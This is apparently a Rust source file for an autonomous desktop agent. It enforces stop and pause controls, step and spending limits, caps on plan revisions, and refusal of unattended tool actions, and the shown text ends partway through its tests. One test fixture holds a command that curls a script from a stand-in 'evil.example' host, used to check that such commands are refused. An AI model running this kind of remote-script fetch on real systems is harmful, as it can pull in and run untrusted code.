use super::*;
use crate::core::agi::executor::{unattended_tool_approval, UNATTENDED_DENIAL_PREFIX};
use crate::core::agi::executors::{granted_folders_for, GrantedFolders};
use crate::core::llm::{LLMRouter, RouterPreferences};
use agiworkforce_model_registry::TrustMode;
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use serde_json::json;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;
use tauri::Emitter;
use tokio::sync::{watch, RwLock};
use tokio::time::sleep;
use tokio_util::sync::CancellationToken;

const MAX_SELF_HEAL_RETRIES: usize = 3;
const MAX_REPLAN_COUNT: usize = 2;
/// How many times a running task may have its remaining steps rewritten by
/// the model, counting replans after a failure and revisions after a step.
/// Past it the plan is frozen, so a model cannot keep a run alive, or keep
/// widening it, by revising without end.
const MAX_PLAN_REVISIONS: usize = 5;
/// The most times a run may execute a step, retries included, when
/// `AgentConfig::max_loop_iterations` is 0. Zero there means "use this
/// default"; any other value is the limit itself. Time spent waiting is not
/// counted, only steps that actually ran.
const DEFAULT_MAX_STEP_RUNS: usize = 100;
/// Maximum number of step outcomes to include in the LLM feedback prompt to avoid
/// exceeding context limits on smaller models.
const MAX_FEEDBACK_HISTORY: usize = 20;
const STEP_PAUSE: Duration = Duration::from_millis(75);
/// How much of one step's output is carried into the run's report.
const STEP_OUTPUT_CHARS: usize = 2_000;
/// How many steps the run's report lists, most recent last.
const REPORTED_STEPS: usize = 50;

/// Tracks a completed step's description and its execution result so that
/// subsequent LLM consultations have full context of what happened.
#[derive(Debug, Clone)]
struct StepOutcome {
    step_id: String,
    description: String,
    result: String,
}

/// Why a run was told to stop.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StopReason {
    Cancelled,
    TimeLimit,
    AppClosing,
}

/// A run that was told to stop before the work it was waiting on finished.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Stopped(pub StopReason);

/// The one switch that stops or pauses a run. Every model call, every step
/// and every wait inside the run is raced against `stop`, so a stop drops the
/// work in flight at once, and a child process a step started dies with it.
/// A pause takes effect at the next step boundary, so the step in flight
/// finishes and resuming never runs a step twice.
#[derive(Clone)]
pub struct RunControl {
    stop: CancellationToken,
    reason: Arc<parking_lot::Mutex<Option<StopReason>>>,
    paused: Arc<watch::Sender<bool>>,
    progress: Arc<watch::Sender<Option<StepProgress>>>,
}

/// Where a run stands, for whoever shows it: the step it is on, counted from
/// one, out of how many the plan holds now.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct StepProgress {
    pub step: usize,
    pub total: usize,
    pub description: String,
}

impl Default for RunControl {
    fn default() -> Self {
        Self::new()
    }
}

impl RunControl {
    pub fn new() -> Self {
        let (paused, _) = watch::channel(false);
        let (progress, _) = watch::channel(None);
        Self {
            stop: CancellationToken::new(),
            reason: Arc::new(parking_lot::Mutex::new(None)),
            paused: Arc::new(paused),
            progress: Arc::new(progress),
        }
    }

    fn report_step(&self, progress: StepProgress) {
        let _ = self.progress.send_replace(Some(progress));
    }

    /// Follows the run's progress; the latest step replaces the one before.
    pub fn progress(&self) -> watch::Receiver<Option<StepProgress>> {
        self.progress.subscribe()
    }

    /// The first reason given is the one the run ends with.
    pub fn stop(&self, reason: StopReason) {
        {
            let mut first = self.reason.lock();
            if first.is_none() {
                *first = Some(reason);
            }
        }
        self.stop.cancel();
    }

    pub fn stop_reason(&self) -> Option<StopReason> {
        *self.reason.lock()
    }

    pub fn pause(&self) {
        let _ = self.paused.send_replace(true);
    }

    pub fn resume(&self) {
        let _ = self.paused.send_replace(false);
    }

    pub fn is_paused(&self) -> bool {
        *self.paused.borrow()
    }

    fn stopped(&self) -> Stopped {
        Stopped(self.stop_reason().unwrap_or(StopReason::Cancelled))
    }

    /// Runs `work` to its end unless the run is stopped first.
    pub async fn unless_stopped<F: std::future::Future>(
        &self,
        work: F,
    ) -> std::result::Result<F::Output, Stopped> {
        tokio::select! {
            biased;
            _ = self.stop.cancelled() => Err(self.stopped()),
            output = work => Ok(output),
        }
    }

    /// The boundary between steps: refuses to go on once stopped, and holds
    /// a paused run here until it is resumed or stopped.
    pub async fn checkpoint(&self) -> std::result::Result<(), Stopped> {
        let mut paused = self.paused.subscribe();
        loop {
            if self.stop.is_cancelled() {
                return Err(self.stopped());
            }
            if !*paused.borrow_and_update() {
                return Ok(());
            }
            tokio::select! {
                _ = self.stop.cancelled() => return Err(self.stopped()),
                changed = paused.changed() => {
                    if changed.is_err() {
                        return Ok(());
                    }
                }
            }
        }
    }
}

/// What a finished run produced.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RunReport {
    /// The model's own account of what the run did and found.
    pub summary: String,
    /// Each step that ran with what it returned, bounded.
    pub steps: Vec<String>,
    /// Plan changes the model asked for that were not adopted.
    pub notes: Vec<String>,
}

/// How a run ended.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RunEnd {
    Completed(RunReport),
    Failed(String),
    Stopped(StopReason),
}

struct RunLimits {
    max_step_runs: usize,
    spend_cap: f64,
    spend_at_start: f64,
}

#[derive(Default)]
struct RunState {
    step_index: usize,
    step_runs: usize,
    plan_revisions: usize,
    completed: Vec<String>,
    outcomes: Vec<StepOutcome>,
    notes: Vec<String>,
}

#[derive(Debug, PartialEq, Eq)]
enum Drive {
    Done,
    Failed(String),
    Stopped(StopReason),
}

/// Everything the step loop needs from outside itself, so the loop's stop,
/// pause and limit behaviour can be driven without a model or a desktop.
#[async_trait]
trait RunHost: Sync {
    fn emit(&self, event: &str, payload: serde_json::Value);
    /// The step with its file path made absolute, once, so the rule that
    /// judges it, the folder check and the executor all name the same file.
    async fn in_project(&self, step: TaskStep) -> TaskStep;
    async fn refusal(&self, action: &Action) -> Option<String>;
    fn revision_refusal(&self, revisions_so_far: usize, revised: &[TaskStep]) -> Option<String>;
    async fn run_step(&self, step: &TaskStep) -> Result<StepResult>;
    async fn replan(
        &self,
        failed_step: &str,
        error: &str,
        completed: &[String],
        goal: &str,
    ) -> Result<Vec<TaskStep>>;
    async fn revise(
        &self,
        goal: &str,
        outcomes: &[StepOutcome],
        remaining: &[TaskStep],
    ) -> Result<Option<Vec<TaskStep>>>;
    async fn spend(&self) -> f64;
}

fn bounded_output(text: &str) -> String {
    match text.char_indices().nth(STEP_OUTPUT_CHARS) {
        Some((cut, _)) => format!("{}...", &text[..cut]),
        None => text.to_string(),
    }
}

/// Runs the plan from where `state` says it stands. It returns at a stop, at
/// a failure or when the last step is done; a pause is waited out inside, so
/// a resumed run goes on from the same step.
async fn drive<H: RunHost>(
    host: &H,
    task: &mut Task,
    state: &mut RunState,
    control: &RunControl,
    limits: &RunLimits,
) -> Drive {
    while state.step_index < task.steps.len() {
        if let Err(Stopped(reason)) = control.checkpoint().await {
            return Drive::Stopped(reason);
        }
        let step_index = state.step_index;
        task.current_step = step_index;
        task.updated_at = std::time::Instant::now();

        let spent = host.spend().await - limits.spend_at_start;
        if spent > limits.spend_cap {
            return Drive::Failed(format!(
                "The agent stopped at its spending limit: it had spent ${:.2} of ${:.2}.",
                spent, limits.spend_cap
            ));
        }

        host.emit(
            "agent:step-started",
            json!({
                "taskId": task.id,
                "step": task.steps[step_index].description,
                "stepIndex": step_index,
                "totalSteps": task.steps.len()
            }),
        );
        control.report_step(StepProgress {
            step: step_index + 1,
            total: task.steps.len(),
            description: task.steps[step_index].description.clone(),
        });

        let mut attempt = 0usize;
        let mut step_succeeded = false;
        loop {
            attempt += 1;
            if let Err(Stopped(reason)) = control.checkpoint().await {
                return Drive::Stopped(reason);
            }
            let step = host.in_project(task.steps[step_index].clone()).await;
            if let Some(refusal) = host.refusal(&step.action).await {
                tracing::warn!("[Agent] Step {} refused: {}", step.id, refusal);
                return Drive::Failed(refusal);
            }
            if state.step_runs >= limits.max_step_runs {
                return Drive::Failed(format!(
                    "The agent stopped at its step limit ({} step runs).",
                    limits.max_step_runs
                ));
            }
            state.step_runs += 1;

            let step_result = match control.unless_stopped(host.run_step(&step)).await {
                Ok(step_result) => step_result,
                Err(Stopped(reason)) => return Drive::Stopped(reason),
            };
            let failure = match step_result {
                Ok(result) if result.success => {
                    let output = bounded_output(result.result.as_deref().unwrap_or("OK"));
                    tracing::info!("[Agent] Step {} completed", step.id);
                    host.emit(
                        "agent:step-completed",
                        json!({
                            "taskId": task.id,
                            "step": step.description,
                            "result": output,
                            "stepIndex": step_index
                        }),
                    );
                    state
                        .completed
                        .push(format!("{}: {}", step.id, step.description));
                    state.outcomes.push(StepOutcome {
                        step_id: step.id.clone(),
                        description: step.description.clone(),
                        result: output,
                    });
                    step_succeeded = true;
                    break;
                }
                Ok(result) => result.error.unwrap_or_else(|| "Unknown error".to_string()),
                Err(error) => error.to_string(),
            };

            let will_retry =
                task.retry_count < task.max_retries && attempt <= MAX_SELF_HEAL_RETRIES;
            tracing::warn!("[Agent] Step {} failed: {}", step.id, failure);
            host.emit(
                "agent:step-failed",
                json!({
                    "taskId": task.id,
                    "step": step.description,
                    "error": failure,
                    "attempt": attempt,
                    "retrying": will_retry
                }),
            );
            if !will_retry {
                return Drive::Failed(format!("Step {} failed: {}", step.id, failure));
            }
            task.retry_count += 1;

            let may_replan = attempt == 2
                && task.replan_count < MAX_REPLAN_COUNT
                && state.plan_revisions < MAX_PLAN_REVISIONS;
            if !may_replan {
                continue;
            }
            let replanned = match control
                .unless_stopped(host.replan(
                    &step.description,
                    &failure,
                    &state.completed,
                    &task.description,
                ))
                .await
            {
                Ok(replanned) => replanned,
                Err(Stopped(reason)) => return Drive::Stopped(reason),
            };
            match replanned {
                Ok(new_steps) if new_steps.is_empty() => {
                    tracing::warn!("[Agent] Replan returned 0 steps, falling back to blind retry");
                }
                Ok(new_steps) => {
                    if let Some(refused) = host.revision_refusal(state.plan_revisions, &new_steps) {
                        let note = revision_not_adopted(&refused);
                        tracing::warn!("[Agent] {}", note);
                        host.emit(
                            "agent:step-failed",
                            json!({
                                "taskId": task.id,
                                "step": step.description,
                                "error": format!("{failure}\n{note}"),
                                "attempt": attempt,
                                "retrying": true
                            }),
                        );
                        state.notes.push(note);
                        continue;
                    }
                    state.plan_revisions += 1;
                    task.steps.truncate(step_index);
                    task.steps.extend(new_steps);
                    task.retry_count = 0;
                    task.replan_count += 1;
                    break;
                }
                Err(error) => {
                    tracing::warn!(
                        "[Agent] Replan failed ({}), falling back to blind retry",
                        error
                    );
                }
            }
        }

        if step_succeeded {
            if step_index + 1 < task.steps.len() && state.plan_revisions < MAX_PLAN_REVISIONS {
                let revised = match control
                    .unless_stopped(host.revise(
                        &task.description,
                        &state.outcomes,
                        &task.steps[step_index + 1..],
                    ))
                    .await
                {
                    Ok(revised) => revised,
                    Err(Stopped(reason)) => return Drive::Stopped(reason),
                };
                match revised {
                    Ok(Some(revised)) if revised.is_empty() => {}
                    Ok(Some(revised)) => {
                        if let Some(refused) = host.revision_refusal(state.plan_revisions, &revised)
                        {
                            let note = revision_not_adopted(&refused);
                            tracing::warn!("[Agent] {}", note);
                            let output = state
                                .outcomes
                                .last()
                                .map(|outcome| outcome.result.as_str())
                                .unwrap_or_default();
                            host.emit(
                                "agent:step-completed",
                                json!({
                                    "taskId": task.id,
                                    "step": task.steps[step_index].description,
                                    "result": format!("{output}\n{note}"),
                                    "stepIndex": step_index
                                }),
                            );
                            state.notes.push(note);
                        } else {
                            task.steps.truncate(step_index + 1);
                            task.steps.extend(revised);
                            state.plan_revisions += 1;
                        }
                    }
                    Ok(None) => {}
                    Err(error) => {
                        tracing::warn!(
                            "[Agent] LLM feedback consultation failed ({}), continuing with original plan",
                            error
                        );
                    }
                }
            }
            state.step_index += 1;
        }

        if let Err(Stopped(reason)) = control.unless_stopped(sleep(STEP_PAUSE)).await {
            return Drive::Stopped(reason);
        }
    }
    Drive::Done
}

/// Why a run could not be planned, for the person reading it: which model was
/// asked, what came back, and what to do about it.
fn planning_failure(trust_mode: TrustMode, error: &str) -> String {
    let (asked, next) = match trust_mode {
        TrustMode::Local | TrustMode::OnDevice => (
            "a model on this computer",
            "Start your local model runtime and pick a model, or switch the app to Cloud, then start the run again. A run started in Local mode is never sent to a cloud model.",
        ),
        TrustMode::Byok => (
            "the provider your own key is for",
            "Check the key in Settings, then start the run again.",
        ),
        TrustMode::ManagedCloud => (
            "AGI Cloud",
            "Check that you are signed in and online, then start the run again.",
        ),
    };
    format!(
        "The run could not be planned. It asked {asked} for a plan and got none: {error}. {next}"
    )
}

fn reported_steps(outcomes: &[StepOutcome]) -> Vec<String> {
    let skipped = outcomes.len().saturating_sub(REPORTED_STEPS);
    outcomes[skipped..]
        .iter()
        .map(|outcome| format!("{}: {}", outcome.description, outcome.result))
        .collect()
}

/// What the run reports when the model's closing summary cannot be had: the
/// last step's own output, which is what the plan was building towards.
fn fallback_summary(outcomes: &[StepOutcome]) -> String {
    outcomes
        .last()
        .map(|outcome| format!("{}: {}", outcome.description, outcome.result))
        .unwrap_or_default()
}

pub struct AutonomousAgent {
    config: AgentConfig,
    router: Arc<RwLock<LLMRouter>>,
    planner: TaskPlanner,
    executor: TaskExecutor,
    vision: VisionAutomation,
    app_handle: Option<tauri::AppHandle>,
    /// The boundary every model call of this run stays inside. It is fixed
    /// when the run starts, so a run begun on this computer is never sent to
    /// a cloud model part way through.
    trust_mode: TrustMode,
    /// The folder relative paths are read against, when the run was started
    /// with one; otherwise the project that is open.
    working_folder: Option<PathBuf>,
}

impl AutonomousAgent {
    pub fn new(
        config: AgentConfig,
        router: Arc<RwLock<LLMRouter>>,
        trust_mode: TrustMode,
    ) -> Result<Self> {
        Ok(Self {
            config,
            planner: TaskPlanner::new(router.clone())?,
            executor: TaskExecutor::new(None)?,
            vision: VisionAutomation::new()?,
            router,
            app_handle: None,
            trust_mode,
            working_folder: None,
        })
    }

    pub fn set_working_folder(&mut self, folder: PathBuf) {
        self.working_folder = Some(folder);
    }

    fn model_route(&self) -> RouterPreferences {
        RouterPreferences {
            trust_mode: Some(self.trust_mode),
            ..RouterPreferences::default()
        }
    }

    /// Set the Tauri AppHandle so the agent can emit events to the frontend.
    pub fn set_app_handle(&mut self, handle: tauri::AppHandle) {
        self.app_handle = Some(handle);
    }

    fn run_limits(&self, spend_at_start: f64) -> RunLimits {
        RunLimits {
            max_step_runs: if self.config.max_loop_iterations > 0 {
                self.config.max_loop_iterations
            } else {
                DEFAULT_MAX_STEP_RUNS
            },
            spend_cap: self
                .config
                .max_cost_per_task
                .min(self.config.effective_session_cap_usd()),
            spend_at_start,
        }
    }

    /// Plans a goal and runs it to its end inside the calling task. Nothing
    /// is spawned, so when `control` stops the run, or the caller drops this
    /// future, no step or model call goes on afterwards.
    ///
    /// Nobody is there to approve a plan, so no plan is ever approved: every
    /// step, in the first plan and in each revision, meets the unattended tool
    /// policy on its own.
    ///
    /// The router keeps one running total for the whole app, so the run's
    /// spend is measured from where that total stood when the run began.
    pub async fn run_goal(&self, goal: String, control: &RunControl) -> RunEnd {
        let spend_at_start = self.router.read().await.get_cumulative_cost();
        let planned = control
            .unless_stopped(self.planner.plan_task(&goal, self.model_route()))
            .await;
        let steps = match planned {
            Err(Stopped(reason)) => return RunEnd::Stopped(reason),
            Ok(Err(error)) => {
                return RunEnd::Failed(planning_failure(self.trust_mode, &error.to_string()))
            }
            Ok(Ok(steps)) => steps,
        };

        let mut task = Task {
            id: format!("task_{}", &uuid::Uuid::new_v4().to_string()[..12]),
            description: goal,
            status: TaskStatus::Executing,
            created_at: std::time::Instant::now(),
            updated_at: std::time::Instant::now(),
            steps,
            current_step: 0,
            max_retries: self.config.max_retries,
            retry_count: 0,
            replan_count: 0,
        };
        tracing::info!("[Agent] Executing task {}", task.id);

        let mut state = RunState::default();
        let limits = self.run_limits(spend_at_start);
        let end = match self.plan_refusal(&task) {
            Some(refusal) => Drive::Failed(refusal),
            None => drive(self, &mut task, &mut state, control, &limits).await,
        };

        match end {
            Drive::Done => {
                task.status = TaskStatus::Completed;
                self.emit(
                    "agent:task-completed",
                    json!({
                        "taskId": task.id,
                        "success": true,
                        "stepsCompleted": state.outcomes.len()
                    }),
                );
                let summary = self
                    .closing_summary(&task.description, &state.outcomes, control, &limits)
                    .await;
                RunEnd::Completed(RunReport {
                    summary,
                    steps: reported_steps(&state.outcomes),
                    notes: state.notes,
                })
            }
            Drive::Failed(mut reason) => {
                for note in &state.notes {
                    reason.push('\n');
                    reason.push_str(note);
                }
                task.status = TaskStatus::Failed(reason.clone());
                self.emit(
                    "agent:task-failed",
                    json!({ "taskId": task.id, "error": reason }),
                );
                RunEnd::Failed(reason)
            }
            Drive::Stopped(reason) => {
                task.status = TaskStatus::Cancelled;
                RunEnd::Stopped(reason)
            }
        }
    }

    /// Why the plan cannot start as planned, if it cannot.
    fn plan_refusal(&self, task: &Task) -> Option<String> {
        if task.steps.is_empty() {
            return Some("The plan had no steps, so there was nothing to run.".to_string());
        }
        for (index, step) in task.steps.iter().enumerate() {
            if let Err(error) = VisionAutomation::check_vision_capability(&step.action) {
                return Some(format!(
                    "Step {} ({}) requires unavailable vision capability: {}",
                    index, step.description, error
                ));
            }
        }
        let refusals = unattended_plan_refusals(self.app_handle.as_ref(), &task.steps);
        (!refusals.is_empty()).then(|| refusals.join("\n"))
    }

    /// The run's result in the model's own words: what it did and what it
    /// found, from the steps' outputs. The plan has no step that writes an
    /// answer, so this is one last model call, made only while the run is
    /// inside its spending limit. When it cannot be had, the last step's own
    /// output stands in.
    async fn closing_summary(
        &self,
        goal: &str,
        outcomes: &[StepOutcome],
        control: &RunControl,
        limits: &RunLimits,
    ) -> String {
        if self.spend().await - limits.spend_at_start > limits.spend_cap {
            return fallback_summary(outcomes);
        }
        let history: Vec<String> = outcomes[outcomes.len().saturating_sub(MAX_FEEDBACK_HISTORY)..]
            .iter()
            .map(|outcome| format!("- {}\n  Result: {}", outcome.description, outcome.result))
            .collect();
        let prompt = format!(
            r#"You ran a task for someone who was not watching. Write what they need to read now: what you did and what you found, in a few plain sentences. Use only the step results below; if a result is missing or empty, say so instead of guessing. Do not repeat the goal back.

Goal: "{goal}"

Steps and their results:
{history}"#,
            goal = goal,
            history = history.join("\n"),
        );

        let answer = control
            .unless_stopped(async {
                self.router
                    .read()
                    .await
                    .send_message(&prompt, Some(self.model_route()))
                    .await
            })
            .await;
        match answer {
            Ok(Ok(summary)) if !summary.trim().is_empty() => bounded_output(summary.trim()),
            Ok(Ok(_)) | Err(_) => fallback_summary(outcomes),
            Ok(Err(error)) => {
                tracing::warn!("[Agent] Closing summary failed: {}", error);
                fallback_summary(outcomes)
            }
        }
    }

    /// BUG-01 fix: Ask the LLM to produce revised steps when a step fails on
    /// the second retry attempt. The prompt includes the failed step, the error
    /// message, and summaries of already-completed steps so the LLM can craft a
    /// plan that accounts for the failure. Returns the new steps parsed from the
    /// LLM response. Falls back to an error if the LLM call or JSON parsing fails,
    /// allowing the caller to continue with the normal retry path.
    async fn replan_on_failure(
        &self,
        failed_step_description: &str,
        error_message: &str,
        completed_summaries: &[String],
        task_goal: &str,
    ) -> Result<Vec<TaskStep>> {
        let completed_str = if completed_summaries.is_empty() {
            "None".to_string()
        } else {
            completed_summaries.join("\n- ")
        };

        let prompt = format!(
            r#"A task step failed during autonomous execution. Provide revised steps to complete the goal.

Failed step: "{}"
Error: "{}"

Previously completed steps:
- {}

Goal: "{}"

Provide ONLY the remaining steps needed (do not repeat completed steps).
Output a JSON array of steps in the same format as the original plan.
Each step needs: id, action (with type), description, expected_result, timeout (seconds), retry_on_failure (boolean).
Be concise."#,
            failed_step_description, error_message, completed_str, task_goal
        );

        let response = self
            .router
            .read()
            .await
            .send_message(&prompt, Some(self.model_route()))
            .await
            .map_err(|e| anyhow!("LLM replan request failed: {}", e))?;

        // Reuse the planner's JSON parsing logic
        self.planner
            .parse_plan_response(&response)
            .map_err(|e| anyhow!("Failed to parse replanned steps: {}", e))
    }

    /// H3 fix: Feed step execution results back to the LLM so it can adjust
    /// the remaining plan. This creates the tool-result feedback loop that was
    /// previously missing, the LLM now sees what each step actually produced
    /// and can revise future steps accordingly.
    ///
    /// Returns `Ok(Some(steps))` if the LLM wants to revise the remaining plan,
    /// `Ok(None)` if the existing plan is confirmed, or `Err` on LLM failure
    /// (caller should treat this as non-fatal and continue with the original plan).
    async fn consult_llm_after_step(
        &self,
        task_goal: &str,
        completed_outcomes: &[StepOutcome],
        remaining_steps: &[TaskStep],
    ) -> Result<Option<Vec<TaskStep>>> {
        // Build the execution history, capping to avoid context overflow
        let history_start = completed_outcomes
            .len()
            .saturating_sub(MAX_FEEDBACK_HISTORY);
        let history_lines: Vec<String> = completed_outcomes[history_start..]
            .iter()
            .map(|o| {
                format!(
                    "- [{}] {}\n  Result: {}",
                    o.step_id, o.description, o.result
                )
            })
            .collect();

        let remaining_lines: Vec<String> = remaining_steps
            .iter()
            .map(|s| format!("- [{}] {}", s.id, s.description))
            .collect();

        let prompt = format!(
            r#"You are an autonomous task execution agent. A step just completed. Review the result and decide if the remaining plan needs adjustment.

Goal: "{task_goal}"

Completed steps and their results:
{history}

Remaining planned steps:
{remaining}

Based on the actual results above, do the remaining steps still make sense?

If the plan is still correct, respond with exactly: PLAN_OK

If the plan needs adjustment based on the step results, provide ONLY the revised remaining steps as a JSON array. Each step needs: id, action (with type), description, expected_result, timeout (seconds), retry_on_failure (boolean).

Use the same action types: Screenshot, Click, Type, Navigate, WaitForElement, ExecuteCommand, ReadFile, WriteFile, SearchText, Scroll, PressKey."#,
            task_goal = task_goal,
            history = history_lines.join("\n"),
            remaining = remaining_lines.join("\n"),
        );

        let response = self
            .router
            .read()
            .await
            .send_message(&prompt, Some(self.model_route()))
            .await
            .map_err(|e| anyhow!("LLM feedback consultation failed: {}", e))?;

        let trimmed = response.trim();

        // If the LLM confirms the plan is fine, return None
        if trimmed == "PLAN_OK" || trimmed.starts_with("PLAN_OK") {
            tracing::debug!("[Agent] LLM confirmed remaining plan is correct");
            return Ok(None);
        }

        // Otherwise, try to parse revised steps
        match self.planner.parse_plan_response(trimmed) {
            Ok(steps) if steps.is_empty() => {
                tracing::debug!("[Agent] LLM feedback returned 0 steps, keeping original plan");
                Ok(None)
            }
            Ok(steps) => Ok(Some(steps)),
            Err(e) => {
                // If the response isn't valid JSON steps, the LLM probably just
                // gave a text confirmation. Treat it as "plan is fine".
                tracing::debug!(
                    "[Agent] LLM feedback response wasn't a step array ({}), keeping original plan",
                    e
                );
                Ok(None)
            }
        }
    }

    /// Holds a file step to the granted folders and the secrets denylist.
    /// This is the only place granted folders are decided for an agent step:
    /// the executor applies every other path rule and relies on this running
    /// before each `execute_step`.
    async fn file_step_refusal(&self, action: &Action) -> Option<String> {
        if !matches!(action, Action::ReadFile { .. } | Action::WriteFile { .. }) {
            return None;
        }
        if let Some(refusal) = relative_path_refusal(action) {
            return Some(refusal);
        }
        match granted_folders_for(self.app_handle.as_ref(), &[]).await {
            Ok(granted) => file_step_refusal_in(&granted, action),
            Err(no_folders) => Some(no_folders.to_string()),
        }
    }
}

#[async_trait]
impl RunHost for AutonomousAgent {
    fn emit(&self, event: &str, payload: serde_json::Value) {
        if let Some(ref handle) = self.app_handle {
            if let Err(error) = handle.emit(event, payload) {
                tracing::warn!("Failed to emit {}: {}", event, error);
            }
        }
    }

    async fn in_project(&self, step: TaskStep) -> TaskStep {
        let action = match &self.working_folder {
            Some(folder) => executor::step_in_folder(&step.action, Some(folder.as_path())),
            None => executor::step_in_project(self.app_handle.as_ref(), &step.action).await,
        };
        TaskStep { action, ..step }
    }

    async fn refusal(&self, action: &Action) -> Option<String> {
        match unattended_refusal(self.app_handle.as_ref(), action) {
            Some(refusal) => Some(refusal),
            None => self.file_step_refusal(action).await,
        }
    }

    fn revision_refusal(&self, revisions_so_far: usize, revised: &[TaskStep]) -> Option<String> {
        revision_refusal(self.app_handle.as_ref(), revisions_so_far, revised)
    }

    async fn run_step(&self, step: &TaskStep) -> Result<StepResult> {
        self.executor.execute_step(step, &self.vision).await
    }

    async fn replan(
        &self,
        failed_step: &str,
        error: &str,
        completed: &[String],
        goal: &str,
    ) -> Result<Vec<TaskStep>> {
        self.replan_on_failure(failed_step, error, completed, goal)
            .await
    }

    async fn revise(
        &self,
        goal: &str,
        outcomes: &[StepOutcome],
        remaining: &[TaskStep],
    ) -> Result<Option<Vec<TaskStep>>> {
        self.consult_llm_after_step(goal, outcomes, remaining).await
    }

    async fn spend(&self) -> f64 {
        self.router.read().await.get_cumulative_cost()
    }
}

/// The chat tool whose approval policy answers for a planned action. Desktop
/// input has none because the executor refuses it outright. The match is
/// exhaustive so a new action cannot reach an unattended run unjudged.
fn approval_tool_for(action: &Action) -> Option<&'static str> {
    match action {
        Action::Screenshot { .. } | Action::WaitForElement { .. } | Action::SearchText { .. } => {
            Some("ui_screenshot")
        }
        Action::Navigate { .. } => Some("browser_navigate"),
        Action::ExecuteCommand { .. } => Some("terminal_execute"),
        Action::ReadFile { .. } => Some("file_read"),
        Action::WriteFile { .. } => Some("file_write"),
        Action::Click { .. }
        | Action::Type { .. }
        | Action::Scroll { .. }
        | Action::PressKey { .. } => None,
    }
}

/// Why a task may not take this action, if it may not. A task runs with
/// nobody watching and no plan is ever approved for it, so each action meets
/// the unattended tool policy on its own.
fn unattended_refusal<R: tauri::Runtime>(
    app_handle: Option<&tauri::AppHandle<R>>,
    action: &Action,
) -> Option<String> {
    let tool_name = approval_tool_for(action)?;
    let Some(app_handle) = app_handle else {
        return Some(format!(
            "{UNATTENDED_DENIAL_PREFIX} '{tool_name}' was refused because the approval service is unavailable."
        ));
    };
    unattended_tool_approval(app_handle, tool_name)
        .err()
        .map(|refusal| refusal.to_string())
}

/// A file path still relative after [`RunHost::in_project`] has no project
/// folder to stand in, so nothing can say which file it names.
fn relative_path_refusal(action: &Action) -> Option<String> {
    let path = match action {
        Action::ReadFile { path } | Action::WriteFile { path, .. } => path,
        _ => return None,
    };
    Path::new(path)
        .is_relative()
        .then(|| format!("Give the full path: '{path}' is relative and no project folder is open."))
}

fn file_step_refusal_in(granted: &GrantedFolders, action: &Action) -> Option<String> {
    let checked = match action {
        Action::ReadFile { path } => granted.readable_path(Path::new(path), "file_read"),
        Action::WriteFile { path, .. } => granted.writable_new_path(Path::new(path), "file_write"),
        _ => return None,
    };
    checked.err().map(|refusal| refusal.to_string())
}

/// Why the model's rewrite of the remaining steps is not adopted, if it is
/// not. A revision is judged whole, by the rule the first plan met, before
/// any of it can run: it cannot add a step the run could not have started
/// with, and it cannot be the one past [`MAX_PLAN_REVISIONS`].
fn revision_refusal<R: tauri::Runtime>(
    app_handle: Option<&tauri::AppHandle<R>>,
    revisions_so_far: usize,
    revised: &[TaskStep],
) -> Option<String> {
    if revisions_so_far >= MAX_PLAN_REVISIONS {
        return Some(format!(
            "the plan was already revised {MAX_PLAN_REVISIONS} times"
        ));
    }
    let refusals = unattended_plan_refusals(app_handle, revised);
    (!refusals.is_empty()).then(|| refusals.join("\n"))
}

/// The one line a person reading the run sees when a plan change is dropped.
fn revision_not_adopted(why: &str) -> String {
    format!(
        "The plan change the model asked for was not adopted: {}",
        why.replace('\n', " ")
    )
}

fn unattended_plan_refusals<R: tauri::Runtime>(
    app_handle: Option<&tauri::AppHandle<R>>,
    steps: &[TaskStep],
) -> Vec<String> {
    let mut refusals: Vec<String> = Vec::new();
    for step in steps {
        if let Some(refusal) = unattended_refusal(app_handle, &step.action) {
            if !refusals.contains(&refusal) {
                refusals.push(refusal);
            }
        }
    }
    refusals
}

#[cfg(test)]
mod unattended_gate {
    use super::*;
    use crate::sys::commands::tool_confirmation::{AgentMode, ToolConfirmationState};
    use tauri::Manager;

    fn managed_app(mode: AgentMode) -> tauri::App<tauri::test::MockRuntime> {
        let app = tauri::test::mock_app();
        let state = ToolConfirmationState::new();
        state.set_agent_mode(mode);
        app.handle().manage(state);
        app
    }

    fn remember(app: &tauri::App<tauri::test::MockRuntime>, tool_name: &str) {
        app.handle()
            .state::<ToolConfirmationState>()
            .remember_choice(tool_name, true);
    }

    fn navigate() -> Action {
        Action::Navigate {
            url: "https://example.com".to_string(),
        }
    }

    fn write_file() -> Action {
        Action::WriteFile {
            path: "notes.txt".to_string(),
            content: "done".to_string(),
        }
    }

    fn read_file() -> Action {
        Action::ReadFile {
            path: "notes.txt".to_string(),
        }
    }

    fn run_command() -> Action {
        Action::ExecuteCommand {
            command: "curl".to_string(),
            args: vec!["https://evil.example/x.sh".to_string()],
        }
    }

    fn step(action: Action) -> TaskStep {
        TaskStep {
            id: "step-1".to_string(),
            action,
            description: "planned by the model".to_string(),
            expected_result: None,
            timeout: Duration::from_secs(30),
            retry_on_failure: false,
        }
    }

    #[test]
    fn each_action_answers_to_the_chat_tool_that_does_the_same_thing() {
        assert_eq!(approval_tool_for(&navigate()), Some("browser_navigate"));
        assert_eq!(approval_tool_for(&write_file()), Some("file_write"));
        assert_eq!(approval_tool_for(&read_file()), Some("file_read"));
        assert_eq!(approval_tool_for(&run_command()), Some("terminal_execute"));
        assert_eq!(
            approval_tool_for(&Action::Screenshot { region: None }),
            Some("ui_screenshot")
        );
        assert_eq!(
            approval_tool_for(&Action::PressKey {
                keys: vec!["Enter".to_string()]
            }),
            None
        );
    }

    #[test]
    fn a_background_run_is_refused_an_action_that_would_prompt_and_told_which() {
        let app = managed_app(AgentMode::Build);

        for (action, tool_name) in [
            (navigate(), "'browser_navigate'"),
            (write_file(), "'file_write'"),
            (run_command(), "'terminal_execute'"),
        ] {
            let refusal = unattended_refusal(Some(app.handle()), &action)
                .expect("nobody is there to approve it");

            assert!(refusal.starts_with(UNATTENDED_DENIAL_PREFIX), "{refusal}");
            assert!(refusal.contains(tool_name), "{refusal}");
        }
    }

    #[test]
    fn a_background_run_reads_and_looks_without_asking() {
        let app = managed_app(AgentMode::Build);

